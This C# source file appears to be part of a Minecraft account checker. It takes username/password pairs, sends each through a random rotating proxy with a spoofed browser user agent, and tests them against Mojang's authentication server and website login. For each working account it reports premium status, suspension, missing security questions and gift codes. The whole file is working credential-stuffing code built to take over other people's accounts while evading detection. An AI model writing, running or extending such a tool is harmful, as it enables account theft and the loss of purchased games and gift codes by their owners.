using xNet;

namespace MC_Checker
{
    public class Mojang
    {
        public static MCAccount GetAccountByClient(string Username, string Password)
        {
            using (var request = new HttpRequest())
            {
                request.UserAgent = Http.ChromeUserAgent();
                request.AddHeader("Accept", "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2");
                request.AllowAutoRedirect = false;
                request.IgnoreProtocolErrors = true;

                switch (Data.ProxyType)
                {
                    case Enums.ProxyType.HTTPS:
                        request.Proxy = HttpProxyClient.Parse(Data.GetRandomProxy());
                        break;
                    case Enums.ProxyType.SOCKS4:
                        request.Proxy = Socks4ProxyClient.Parse(Data.GetRandomProxy());
                        break;
                    case Enums.ProxyType.SOCKS5:
                        request.Proxy = Socks5ProxyClient.Parse(Data.GetRandomProxy());
                        break;
                }

                var response = string.Empty;

                try
                {
                    response = request.Post("https://authserver.mojang.com/authenticate", "{\"agent\": {\"name\":\"Minecraft\",\"version\":\"1\"},\"username\":\"" + Username + "\",\"password\":\"" + Password + "\",\"requestUser\":\"true\"}", "application/json").ToString();
                }
                catch
                {
                    return new MCAccount(Username, Password);
                }

                var json = Json.Deserialize(response);

                if (json.ContainsKey("error"))
                {
                    return new MCAccount(Username, Password);
                }

                var IsPremium = json.ContainsKey("selectedProfile");
                var IsSuspended = json["user"]["suspended"];
                var IsBlocked = json["user"]["blocked"];
                var IsEmailVerified = json["user"]["emailVerified"];

                var Name = IsPremium ? json["selectedProfile"]["name"] : string.Empty;

                return new MCAccount(Name, Username, Password, IsPremium, IsSuspended, IsBlocked, IsEmailVerified);
            }
        }

        public static MCAccount GetAccountBySite(string Username, string Password)
        {
            using (var request = new HttpRequest())
            {
                CookieDictionary cookies = new CookieDictionary();
                request.Cookies = cookies;
                request.AllowAutoRedirect = false;

                var reqParams = new RequestParams();

                reqParams["username"] = Username;
                reqParams["password"] = Password;

                HttpResponse response;

                try
                {
                    response = request.Post("https://account.mojang.com/login", reqParams);
                }
                catch
                {
                    return new MCAccount(Username, Password);
                }

                if (!response.Location.StartsWith("https://account.mojang.com/me"))
                {
                    return new MCAccount(Username, Password);
                }

                var Name = string.Empty;
                var IsPremium = false;
                var IsSecureQuestion = true;
                var HasGifts = false;

                var UserProfile = request.Get(response.Location);

                if (UserProfile.Location == "https://account.mojang.com/me/challenge")
                {
                    return new MCAccount(Name, Username, Password, true, true, false);
                }

                if (UserProfile.ToString().Contains("Secure my account"))
                {
                    IsSecureQuestion = false;
                }

                if (UserProfile.ToString().Contains("My Games"))
                {
                    IsPremium = true;
                }

                if (UserProfile.ToString().Contains("<th>Gift Code</th>"))
                {
                    HasGifts = true;
                }

                return new MCAccount(Name, Username, Password, IsPremium, IsSecureQuestion, HasGifts);
            }
        }
    }
}
